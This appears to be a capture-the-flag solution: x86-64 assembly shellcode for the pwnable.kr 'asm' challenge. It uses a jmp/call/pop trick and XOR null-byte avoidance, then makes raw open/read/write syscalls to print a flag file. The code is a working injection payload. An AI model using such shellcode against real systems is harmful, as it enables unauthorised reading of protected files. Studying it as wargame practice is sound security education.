section .text
	global _start



_start:
	jmp _push_filename
  
_readfile:
	; syscall open file
	pop rdi ; pop path value
	; NULL byte fix
	xor byte [rdi + 233], 0x41
  
	xor rax, rax
	add al, 2
	xor rsi, rsi ; set O_RDONLY flag
	syscall
  
	; syscall read file
	sub sp, 0xfff
	lea rsi, [rsp]
	mov rdi, rax
	xor rdx, rdx
	mov dx, 0xfff; size to read
	xor rax, rax
	syscall
  
	; syscall write to stdout
	xor rdi, rdi
	add dil, 1 ; set stdout fd = 1
	mov rdx, rax
	xor rax, rax
	add al, 1
	syscall
  
	; syscall exit
	xor rax, rax
	add al, 60
	syscall
  
	_push_filename:
	call _readfile
	path: db "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ongA"
